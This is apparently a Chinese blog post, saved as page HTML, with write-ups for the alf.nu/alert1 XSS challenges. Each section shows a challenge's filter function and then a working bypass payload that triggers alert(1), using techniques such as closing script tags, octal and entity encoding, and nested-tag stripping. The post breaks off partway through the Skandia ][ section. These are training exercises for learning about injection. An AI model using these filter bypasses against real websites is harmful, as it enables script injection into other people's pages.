<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><link rel="preload" as="font" href="/_next/static/media/2aaf0723e720e8b9-s.p.woff2" crossorigin="" type="font/woff2"/><link rel="stylesheet" href="/_next/static/css/9de7766929c1e55d.css" data-precedence="next"/><link rel="stylesheet" href="/_next/static/css/6c438bdd1a6b11fe.css" data-precedence="next"/><title>XSSç»ƒä¹ :alf.nu/alert1 Write-ups</title><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="any"/><meta name="next-size-adjust"/><script src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js" noModule=""></script></head><body class="antialiased min-h-screen bg-white dark:bg-slate-950 text-slate-900 dark:text-slate-50 bg-grey __className_0ec1f4"><script>!function(){try{var d=document.documentElement,c=d.classList;c.remove('light','dark');var e=localStorage.getItem('theme');if('system'===e||(!e&&true)){var t='(prefers-color-scheme: dark)',m=window.matchMedia(t);if(m.media!==t||m.matches){d.style.colorScheme = 'dark';c.add('dark')}else{d.style.colorScheme = 'light';c.add('light')}}else if(e){c.add(e|| '')}if(e==='light'||e==='dark')d.style.colorScheme=e}catch(e){}}()</script><div class="my-max mx-auto py-10 px-4"><header><div class="my-flex"><div class="flex space-x-6 "><p class="blog-name font-medium text-2xl">Always Exploring</p></div><nav class="nav-ml text-sm font-medium space-x-6"><a href="/">Home</a><a href="/about">About</a></nav></div></header><main><div class="js-toc my-toc"></div><article class="py-6 prose post-prose dark:prose-invert"><div class="post-title">XSSç»ƒä¹ :alf.nu/alert1 Write-ups</div><time dateTime="2018-01-29T17:26:26.000Z" class="post-time">January 29, 2018</time><div class="js-toc-content"><h1 id="å‰è¨€">å‰è¨€</h1>
<p>è¿™äº›å¤©åœ¨<a href="https://alf.nu/alert1">alf.nu/alert1</a>ä¸Šåšäº†XSSç»ƒä¹ é¢˜ï¼Œç›®å‰å¤§éƒ¨åˆ†åšå‡ºæ¥äº†ï¼Œä½†æœ‰äº›é¢˜ç›®å¹¶ä¸æ˜¯æœ€ä¼˜è§£ã€‚è¿˜å‰©ä¸‹2é“é¢˜æ²¡æœ‰åšå‡ºï¼ˆFruit3, Qunieï¼‰ï¼Œåœ¨æ­¤åšä¸ªè®°å½•ã€‚æ¬¢è¿å¤§å®¶äº¤æµã€‚</p>
<h1 id="warmup">Warmup</h1>
<pre><code class="hljs language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">s</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span>+s+<span class="hljs-string">&#x27;&quot;);&lt;/script&gt;&#x27;</span>;
}
</code></pre>
<p>è¿™é¢˜å¯¹è¾“å…¥æ²¡æœ‰é™åˆ¶ï¼Œåªè¦é—­åˆæ‰console.logå³å¯ã€‚
solution(12 chars): <code>&quot;);alert(1,&quot;</code></p>
<br/>
<br/>
<br/>
<br/>
<h1 id="adobe">Adobe</h1>
<pre><code class="hljs language-js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">s</span>) {
  s = s.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;\\&quot;&#x27;</span>);
  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="hljs-string">&#x27;&quot;);&lt;/script&gt;&#x27;</span>;
}
</code></pre>
<p>è¿™é¢˜escapeå°†è¾“å…¥çš„å¼•å·<code>&quot;</code>è½¬æ¢ä¸ºäº†<code>\\&quot;</code>ï¼Œä½¿å¾—å¼•å·å˜æˆäº†å­—é¢é‡ï¼Œä¸Šä¸€é¢˜çš„æ–¹æ³•æ— æ•ˆäº†ã€‚ä¸è¿‡å¦‚æœè¾“å…¥ä¸º<code>\&quot;</code>ï¼Œé‚£ä¹ˆå°±ä¼šè½¬æ¢ä¸º<code>\\\&quot;</code>ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæœ¬æ¥æ˜¯è½¬ä¹‰å¼•å·çš„ï¼Œä½†å˜æˆäº†è½¬ä¹‰åæ–œæ†äº†ï¼Œä»è€Œå¼•å·å¯ä»¥é€ƒè„±è½¬ä¹‰äº†ã€‚
solution(14 chars): <code>\&quot;);alert(1)//</code></p>
<h1 id="json">JSON</h1>
<pre><code class="hljs language-js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">s</span>) {
  s = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(s);
  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&#x27;</span> + s + <span class="hljs-string">&#x27;);&lt;/script&gt;&#x27;</span>;
}
</code></pre>
<p>è¿™é¢˜å¯¹è¾“å…¥çš„å­—ç¬¦ä¸²ç”¨äº†<code>JSON.stringify()</code>(<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify">ç›¸å…³ä»‹ç»</a>)æ¥å¤„ç†å­—ç¬¦ä¸²ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯è¿‡æ»¤äº†<code>\</code>,<code>&quot;</code>ç­‰å­—ç¬¦ï¼Œåˆ†åˆ«è½¬åŒ–ä¸º<code>\\</code>,<code>\&quot;</code>ç­‰ï¼Œä½†æ²¡æœ‰è¿‡æ»¤<code>&lt;</code>,<code>&gt;</code>,<code>/</code>å­—ç¬¦ï¼Œè¿™å°±å¤Ÿç”¨äº†ã€‚æ—¢ç„¶é—­åˆä¸äº†<code>log</code>å‡½æ•°ï¼Œé‚£å°±é—­åˆ<code>script</code>æ ‡ç­¾å§
solution(27 chars): <code>&lt;/script&gt;&lt;script&gt;alert(1)//</code></p>
<br/>
<br/>
<br/>
<br/>
<h1 id="javascript">JavaScript</h1>
<pre><code class="hljs language-js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">s</span>) {
  <span class="hljs-keyword">var</span> url = <span class="hljs-string">&#x27;javascript:console.log(&#x27;</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(s) + <span class="hljs-string">&#x27;)&#x27;</span>;
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(url);

  <span class="hljs-keyword">var</span> a = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;a&#x27;</span>);
  a.<span class="hljs-property">href</span> = url;
  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(a);
  a.<span class="hljs-title function_">click</span>();
}
</code></pre>
<p>åŒæ ·å› ä¸º<code>JSON.stringify()</code>çš„åŸå› æ²¡åŠæ³•ç”¨ç›´æ¥ç”¨<code>&quot;</code>ï¼Œä½†æ˜¯ç”±äºè¿™æ¬¡æ³¨å…¥çš„åœ°æ–¹æ˜¯urlï¼Œæ‰€ä»¥å¯ä»¥ç”¨URLç¼–ç çš„åŠæ³•è®²<code>&quot;</code>è½¬æ¢ä¸º<code>%22</code>ã€‚
solution(15 chars): <code>%22);alert(1)//</code></p>
<br/>
<br/>
<br/>
<br/>
<h1 id="markdown">Markdown</h1>
<pre><code class="hljs language-js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">s</span>) {
  <span class="hljs-keyword">var</span> text = s.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>);
  <span class="hljs-comment">// URLs</span>
  text = text.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/(http:\/\/\S+)/g</span>, <span class="hljs-string">&#x27;&lt;a href=&quot;$1&quot;&gt;$1&lt;/a&gt;&#x27;</span>);
  <span class="hljs-comment">// [[img123|Description]]</span>
  text = text.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\[\[(\w+)\|(.+?)\]\]/g</span>, <span class="hljs-string">&#x27;&lt;img alt=&quot;$2&quot; src=&quot;$1.gif&quot;&gt;&#x27;</span>);
  <span class="hljs-keyword">return</span> text;
}
</code></pre>
<p>é¦–å…ˆåˆ†æè¿™é¢˜çš„å¤„ç†æ–¹æ³•</p>
<ol>
<li>é¦–å…ˆï¼Œå¯¹äºä»»ä½•è¾“å…¥ï¼Œå…ˆè¿‡æ»¤æ‰<code>&lt;</code>å’Œ<code>&quot;</code>å˜ä¸ºå®ä½“ç¼–ç <code>&amp;lt</code>å’Œ<code>&amp;quot</code>ã€‚</li>
<li>å¦‚æœå­—ç¬¦ä¸²ä¸­æœ‰åŒ…å«<code>http://</code>å¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚<code>http://xiao.world</code>åˆ™å˜ä¸º<code>&lt;a href=&quot;http://xiao.world&quot;&gt;http://xiao.world&lt;/a&gt;</code></li>
<li>å¦‚æœå­—ç¬¦ä¸²ä¸­åŒ…å«<code>[[img_src|img_alt]]</code>æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œåˆ™å˜ä¸º<code>&lt;img alt=&quot;img_alt&quot; src=&quot;this_src.git&quot;&gt;</code></li>
<li>è¿”å›å­—ç¬¦ä¸²</li>
</ol>
<p>å¯¹äºè¿™ä¸ªé¢˜ç›®ï¼Œå› ä¸ºå°–æ‹¬å·å’Œå¼•å·éƒ½è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¦ä»è¿™é‡Œå…¥æ‰‹ä¼šæ¯”è¾ƒå›°éš¾ã€‚ä½†æ˜¯å¯ä»¥åˆ©ç”¨ç¬¬äºŒç‚¹å’Œç¬¬ä¸‰ç‚¹çš„è§„åˆ™æ¥åšçªç ´å£ã€‚ä¸ºç”šä¹ˆè¿™ä¹ˆè¯´å‘¢ï¼Ÿæ—¢ç„¶è‡ªå·±æ²¡åŠæ³•é—­åˆå±æ€§çš„å¼•å·æˆ–è€…æ ‡ç­¾ï¼Œä½†æ˜¯è§„åˆ™äºŒè½¬æ¢ä¹‹åä¼šå¸¦æœ‰å¼•å·ï¼Œåˆ©ç”¨è¿™ä¸ªå¼•å·ï¼Œå°±å¯ä»¥é—­åˆæ‰è§„åˆ™ä¸‰è½¬æ¢ä¹‹åçš„imgæ ‡ç­¾çš„altå±æ€§äº†ã€‚
è¾“å…¥ï¼š<code>[[a|http://onerror=&#x27;alert(1)]]</code>
ç»è¿‡è§„åˆ™ä¸€è½¬æ¢å:<code>[[a|&lt;a href=&quot;http://onerror=&#x27;alert(1)&#x27;]]&quot;&gt;http://onerror=&#x27;alert(1)&#x27;]]&lt;/a&gt;</code>
å†ç»è¿‡è§„åˆ™äºŒè½¬æ¢ï¼š <code>&lt;img alt=&quot;&lt;a href=&quot;http://onerror=&#x27;alert(1)&#x27;&quot; src=&quot;a.gif&quot;&gt;&quot;&gt;http://onerror=&#x27;alert(1)&#x27;]]&lt;/a&gt;</code>
æ„Ÿè°¢HTMLè¯­è¨€æ¾æ•£çš„ç‰¹æ€§ï¼Œä»¥ä¸Šå³ç›¸å½“äº: <code>&lt;img alt=&quot;&lt;a href=&quot; http:=&quot;&quot; onerror=&quot;alert(1)&quot; &quot;=&quot;&quot; src=&quot;a.gif&quot;&gt;</code>
å†ç²¾ç®€ä¸€ç‚¹ï¼Œåªçœ‹å…³é”®éƒ¨åˆ†: <code>&lt;img alt=&quot;&lt;a href=&quot; onerror=&quot;alert(1)&quot; src=&quot;a.git&quot;&gt;</code>
è‡³æ­¤ï¼Œå¤§åŠŸå‘ŠæˆğŸ˜„ã€‚
solution(31 chars): <code>[[a|http://onerror=&#x27;alert(1)&#x27;]]</code></p>
<br/>
<br/>
<br/>
<br/>
<h1 id="dom">DOM</h1>
<pre><code class="hljs language-js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">s</span>) {
  <span class="hljs-comment">// Slightly too lazy to make two input fields.</span>
  <span class="hljs-comment">// Pass in something like &quot;TextNode#foo&quot;</span>
  <span class="hljs-keyword">var</span> m = s.<span class="hljs-title function_">split</span>(<span class="hljs-regexp">/#/</span>);

  <span class="hljs-comment">// Only slightly contrived at this point.</span>
  <span class="hljs-keyword">var</span> a = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;div&#x27;</span>);
  a.<span class="hljs-title function_">appendChild</span>(<span class="hljs-variable language_">document</span>[<span class="hljs-string">&#x27;create&#x27;</span>+m[<span class="hljs-number">0</span>]].<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">document</span>, m.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>)));
  <span class="hljs-keyword">return</span> a.<span class="hljs-property">innerHTML</span>;
}
</code></pre>
<p>å…³é”®åœ¨äºç†è§£ç¬¬å…«è¡Œçš„ä»£ç ã€‚
å¦‚æœè¾“å…¥ä¸º<code>Element#alert</code>
ç¬¬å…«è¡Œä¸ºï¼š<code>document[&quot;createElement&quot;].apply(document, &quot;alert&quot;)</code>
ç›¸å½“äº<code>document.createElement(&quot;alert&quot;)</code>
è¿™æ ·åªæ˜¯åˆ›å»ºäº†ä¸€ä¸ª<code>&lt;alert&gt;</code>æ ‡ç­¾ï¼Œæˆ‘ä»¬æ²¡æœ‰åŠæ³•æ³¨å…¥ã€‚æ‰€ä»¥æŸ¥ä¸€ä¸‹documentæœ‰å“ªäº›createå¼€å¤´çš„æ–¹æ³•ï¼Œä¸€ä¸‹åˆ—å‡ºä¸€äº›å¸¸ç”¨çš„ï¼š</p>
<blockquote>
<p>createElement
createTextNode
createComment
createAttribute
createEvent</p>
</blockquote>
<p>è¿™é‡Œçœ‹åˆ°æœ‰<code>createComment</code>å°±ä»¤äººç‰¹åˆ«å¼€å¿ƒã€‚æ‰€ä»¥ç­”æ¡ˆè§ä¸‹
solution(32 chars): <code>Comment#&gt;&lt;iframe onload=alert(1)</code></p>
<br/>
<br/>
<br/>
<br/>
<h1 id="callback">Callback</h1>
<pre><code class="hljs language-js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">s</span>) {
  <span class="hljs-comment">// Pass inn &quot;callback#userdata&quot;</span>
  <span class="hljs-keyword">var</span> thing = s.<span class="hljs-title function_">split</span>(<span class="hljs-regexp">/#/</span>);

  <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[a-zA-Z\[\]&#x27;]*$/</span>.<span class="hljs-title function_">test</span>(thing[<span class="hljs-number">0</span>])) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid callback&#x27;</span>;
  <span class="hljs-keyword">var</span> obj = {<span class="hljs-string">&#x27;userdata&#x27;</span>: thing[<span class="hljs-number">1</span>] };
  <span class="hljs-keyword">var</span> json = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;\\u003c&#x27;</span>);
  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;&quot;</span> + thing[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;(&quot;</span> + json +<span class="hljs-string">&quot;)&lt;/script&gt;&quot;</span>;
}
</code></pre>
<p>éšä¾¿è¾“å…¥ç‚¹çœ‹çœ‹æ•ˆæœå§ï¼š<code>input1#input2</code>
è¾“å‡º: <code>&lt;script&gt;input1({&quot;userdata&quot;:&quot;input2&quot;})&lt;/script&gt;</code>
å› ä¸ºinput1æœ‰è¾“å…¥è¦æ±‚ï¼Œä½†æ˜¯input2å¯ä»¥ä¸ºä»»æ„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ³¨å…¥å¯ä»¥æ”¾åœ¨input2ï¼Œä½†æ˜¯åœ¨input2ä¹‹å‰æœ‰ä¸€å †å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿ï¼Œæœ€ç›´æ¥ç®€å•çš„åŠæ³•å°±æ˜¯ç”¨å¼•å·é—­åˆæ‰ä»–ä»¬å°±å¥½äº†ã€‚æ‰€å¹¸input1å¹¶æ²¡æœ‰æŠŠå•å¼•å·è¿‡æ»¤æ‰ï¼Œæ‰€ä»¥ç­”æ¡ˆå°±æ˜¯
solution(15 chars): <code>&#x27;#&#x27;;alert(1);//</code></p>
<br/>
<br/>
<br/>
<br/>
<h1 id="skandia">Skandia</h1>
<pre><code class="hljs language-js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">s</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s.<span class="hljs-title function_">toUpperCase</span>() + <span class="hljs-string">&#x27;&quot;)&lt;/script&gt;&#x27;</span>;
}
</code></pre>
<p>é¢˜ç›®çœŸçŸ­ï¼Œä½†å¿ƒæ€æ²¡å°‘èŠ±å‘€ã€‚
jsçš„æ–¹æ³•åæ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼Œå¦‚æœæŠŠ<code>alert</code>å˜ä¸ºäº†<code>ALERT</code>ï¼Œé‚£å°±ä¸è¡Œäº†ã€‚ä½†æ˜¯HTMLæ ‡ç­¾åå’Œå±æ€§åæ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é—­åˆæ‰<code>&lt;script&gt;</code>æ ‡ç­¾ï¼Œç„¶åè‡ªå·±æ³¨å…¥æ ‡ç­¾ï¼Œåˆ©ç”¨<code>onload</code>å±æ€§å‡ºå‘<code>alert</code>ï¼Œä½†æ˜¯æœ‰ä¸ªé—®é¢˜å°±æ˜¯<code>alert</code>å¤§å°å†™æ€ä¹ˆåŠå‘¢ï¼Ÿä¾æˆ‘ä¸ªäººæµ‹è¯•å’Œç†è§£(æš‚æ—¶æœªæ‰¾åˆ°æ ¹æ®)ï¼Œåœ¨å±æ€§å€¼å¤„ä½¿ç”¨å®ä½“ç¼–ç çš„è¯ï¼Œæ˜¯å¯ä»¥è‡ªåŠ¨è§£ç çš„,å…¶ä»–åœ°æ–¹åˆ™ä¸è¡Œã€‚æ‰€ä»¥ï¼Œé—®é¢˜è§£å†³äº†ã€‚
solution(53 chars): <code>&lt;/script&gt;&lt;iframe onload=&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74(1)&gt;</code>
ä½†æˆ‘è¿™ä¸ªè§£ç”¨äº†53ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸æ˜¯æœ€çŸ­çš„ï¼Œä½†æ˜¯æœ‰äººä¹Ÿæœ‰äººåšåˆ°äº†30å¤šå’Œ40å¤šçš„ï¼Œæˆ‘æš‚æ—¶ä¹Ÿæƒ³ä¸åˆ°ä»€ä¹ˆåŠæ³•ã€‚æœ‰çŸ¥é“çš„è¯·å‘Šè¯‰æˆ‘ä¸€å£°ï¼Œè°¢è°¢ğŸ˜„</p>
<br/>
<br/>
<br/>
<br/>
<h1 id="template">Template</h1>
<pre><code class="hljs language-js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">s</span>) {
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">htmlEscape</span>(<span class="hljs-params">s</span>) {
    <span class="hljs-keyword">return</span> s.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/./g</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">x</span>) {
       <span class="hljs-keyword">return</span> { <span class="hljs-string">&#x27;&lt;&#x27;</span>: <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>: <span class="hljs-string">&#x27;&amp;gt;&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>: <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>: <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>: <span class="hljs-string">&#x27;&amp;#39;&#x27;</span> }[x] || x;
     });
  }

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">expandTemplate</span>(<span class="hljs-params">template, args</span>) {
    <span class="hljs-keyword">return</span> template.<span class="hljs-title function_">replace</span>(
        <span class="hljs-regexp">/{(\w+)}/g</span>,
        <span class="hljs-keyword">function</span>(<span class="hljs-params">_, n</span>) {
           <span class="hljs-keyword">return</span> <span class="hljs-title function_">htmlEscape</span>(args[n]);
         });
  }

  <span class="hljs-keyword">return</span> <span class="hljs-title function_">expandTemplate</span>(
    <span class="hljs-string">&quot;                                                \n\
      &lt;h2&gt;Hello, &lt;span id=name&gt;&lt;/span&gt;!&lt;/h2&gt;         \n\
      &lt;script&gt;                                       \n\
         var v = document.getElementById(&#x27;name&#x27;);    \n\
         v.innerHTML = &#x27;&lt;a href=#&gt;{name}&lt;/a&gt;&#x27;;       \n\
      &lt;\/script&gt;                                     \n\
    &quot;</span>,
    { name : s }
  );
}
</code></pre>
<p>ç®€å•æ¥è¯´ï¼Œå¯¹è¾“å…¥å­—ç¬¦ä¸²è¿‡æ»¤æ‰å°–æ‹¬å·ï¼Œå¼•å·ç­‰ï¼Œç„¶åå°†å¤„ç†å®Œçš„å­—ç¬¦ä¸²æ›¿æ¢æ‰æ¨¡æ¿å­—ç¬¦ä¸²ä¸­<code>{name}</code>ã€‚ä½†æ˜¯ç™¾å¯†ä¸€ç–ï¼Œå­—ç¬¦ä¸²ä¸­å¯ä»¥ç”¨8è¿›åˆ¶æˆ–è€…16è¿›åˆ¶æ¥è¡¨ç¤ºå­—ç¬¦ã€‚æ‰€ä»¥ç­”æ¡ˆå°±å‡ºæ¥äº†ã€‚<code>&lt;</code>å¯¹åº”çš„å…«è¿›åˆ¶æ˜¯<code>\74</code>ã€‚
solution(27): <code>\74iframe onload=alert(1)//</code></p>
<br/>
<br/>
<br/>
<br/>
<h1 id="json-">JSON ][</h1>
<pre><code class="hljs language-js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">s</span>) {
  s = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(s).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&lt;\/script/gi</span>, <span class="hljs-string">&#x27;&#x27;</span>);

  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&#x27;</span> + s + <span class="hljs-string">&#x27;);&lt;/script&gt;&#x27;</span>;
}
</code></pre>
<p>è¿™é“é¢˜ä¹ŸæŒºæœ‰æ„æ€çš„ã€‚æ ¼å¼åŒ–ä¹‹åå†æŠŠ<code>&lt;/script</code>æ›¿æ¢æˆç©ºä¸²ã€‚ä½¿ç”¨ä¸€ç‚¹æŠ€å·§å°±å¯ä»¥ç»•è¿‡äº†ã€‚
solution(35): <code>&lt;/scr&lt;/scriptipt&gt;&lt;script&gt;alert(1)//</code></p>
<br/>
<br/>
<br/>
<br/>
<h1 id="callback-">Callback ][</h1>
<pre><code class="hljs language-js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">s</span>) {
  <span class="hljs-comment">// Pass inn &quot;callback#userdata&quot;</span>
  <span class="hljs-keyword">var</span> thing = s.<span class="hljs-title function_">split</span>(<span class="hljs-regexp">/#/</span>);

  <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[a-zA-Z\[\]&#x27;]*$/</span>.<span class="hljs-title function_">test</span>(thing[<span class="hljs-number">0</span>])) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid callback&#x27;</span>;
  <span class="hljs-keyword">var</span> obj = {<span class="hljs-string">&#x27;userdata&#x27;</span>: thing[<span class="hljs-number">1</span>] };
  <span class="hljs-keyword">var</span> json = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\//g</span>, <span class="hljs-string">&#x27;\\/&#x27;</span>);
  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;&quot;</span> + thing[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;(&quot;</span> + json +<span class="hljs-string">&quot;)&lt;/script&gt;&quot;</span>;
}
</code></pre>
<p>å’Œä¸Šé¢çš„é¢˜ç›®<a href="#Callback">Callback</a>ä¸€æ ·ï¼Œåªæ˜¯å› ä¸ºè¿‡æ»¤äº†<code>/</code>ï¼Œä¸èƒ½ç”¨<code>//</code>æ³¨é‡Šäº†è€Œå·²ï¼Œé‚£å°±æ¢ä¸€ç§æ³¨é‡Šæ–¹å¼å§
solution(16): <code>&#x27;#&#x27;;alert(1)&lt;!--</code></p>
<br/>
<br/>
<br/>
<br/>
<h1 id="skandia-">Skandia ][</h1>
<pre><code>
function escape(s) {
  if (/[&lt;&gt;]/.test(s)) return &#x27;-&#x27;;

  return &#x27;&lt;script&gt;console.log(&quot;&#x27; + s.toUpperCase() + &#x27;&quot;)&lt;/script&gt;&#x27;;
}
</code></pre>
<p>é¦–å…ˆè€ƒè™‘åˆ°å¯ä»¥é—­åˆ<code>script</code>æ ‡ç­¾ï¼Œä½†æ˜¯è¿™é¢˜è¿‡æ»¤äº†å°–æ‹¬å·ï¼Œæƒ³åˆ°ä¸Šä¸€é¢˜<a href="#Template">Template</a>çš„æ–¹æ³•ï¼Œå³ç”¨åå…­è¿›åˆ¶æˆ–å…«è¿›åˆ¶æ¥è¡¨ç¤ºå°–æ‹¬å·ï¼Œä½†æ˜¯ç»è¿‡æµ‹è¯•å‘ç°ï¼Œåœ¨è¿™é¢˜å¹¶ä¸ç®¡ç”¨ã€‚æƒ³ä¸æ˜ç™½ä¸ºç”šä¹ˆï¼Œä½†æ˜¯æµ‹è¯•ç»“æœæ˜¯ï¼šå­—ç¬¦ä¸²çš„<code>replace</code>æ–¹æ³•æ˜¯è®¤ä¸å‡ºåå…­è¿›æˆ–è€…å…«è¿›åˆ¶ä»£è¡¨çš„å­—ç¬¦çš„ï¼Œä½†æ˜¯<code>test</code>æ–¹æ³•å´å¯ä»¥ã€‚æ‰€ä»¥ä¸Šä¸€é¢˜Templateç”¨çš„è¿‡æ»¤æ–¹æ³•replaceè¿‡æ»¤<code>&lt;</code>æ‹¬å·æ—¶ï¼Œç”±äºæˆ‘ä»¬ç”¨äº†<code>\74</code>æ¥è¡¨ç¤ºï¼Œè€Œreplaceæ–¹æ³•å¹¶ä¸è®¤è¯†å®ƒï¼Œæ‰€ä»¥ç»•è¿‡äº†è¿‡æ»¤ã€‚ä½†æ˜¯è¿™é¢˜ç”¨äº†<code>test</code>æ–¹æ³•ï¼Œé¢å¯¹åŒæ ·çš„æƒ…å†µï¼Œå®ƒçŸ¥é“<code>\74</code>å³ä»£è¡¨ç€<code>&lt;</code>ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ— æ•ˆäº†ã€‚
æ—¢ç„¶ä¸èƒ½é—­åˆ<code>script</code>ï¼Œé‚£å°±å¯ä»¥è€ƒè™‘é—­åˆ<code>log</code>ï¼Œåº”è¯¥æ³¨å…¥çš„payloadæ˜¯<code>&quot;);alert(1)//</code>ï¼Œä½†æ˜¯alertè½¬ä¸ºå¤§å†™å°±ä¸è¡Œäº†ã€‚æ­¤æ—¶æœ€ç®€å•ç²—æš´çš„æ–¹æ³•æ˜¯ç›´æ¥ç”¨<a href="http://utf-8.jp/public/jjencode.html">jjencode</a>( an online non-alphanumeric encoder)ã€‚å°†<code>alert(1)</code>ç”¨jjencode encodeå¾—åˆ°çš„è½¬ç åçš„ç»“æœï¼Œç”±äºç»“æœå¤ªé•¿äº†ï¼Œæ‰€ä»¥ç”¨jjencodeä»£è¡¨ï¼Œåˆ™
solutioon(538)ä¸º: <code>&quot;);jjencode//</code></p>
<p>ä½†æ˜¯538ä¸ªå­—ç¬¦è¿˜æ˜¯å¤ªé•¿äº†ã€‚åœ¨<a href="http://www.pwntester.com/blog/2014/01/08/escape-alf-nu-xss-challenges-write-ups-part-257/">pwntester</a>çš„åšå®¢é‡Œçœ‹åˆ°äº†ä¸€ä¸ªæ›´å¥½çš„åŠæ³•ã€‚
é¦–å…ˆåº”è¯¥æ³¨å…¥çš„payloadæ˜¯<code>&quot;+alert(1))//&quot;</code>
ä½†æ˜¯è¦æƒ³åŠæ³•ç”¨ç›¸ç­‰æ•ˆæœçš„è¯­å¥æ›¿æ¢æ‰alert(1)ã€‚
åœ¨åšå®¢ä¸Šçœ‹åˆ°ä¸€ä¸ªæ–¹æ³•ä¹Ÿå¯ä»¥è§¦å‘alert(1)</p>
<pre><code class="hljs language-js">[][<span class="hljs-string">&quot;sort&quot;</span>][<span class="hljs-string">&quot;constructor&quot;</span>](<span class="hljs-string">&quot;alert(1)&quot;</span>)()
</code></pre>
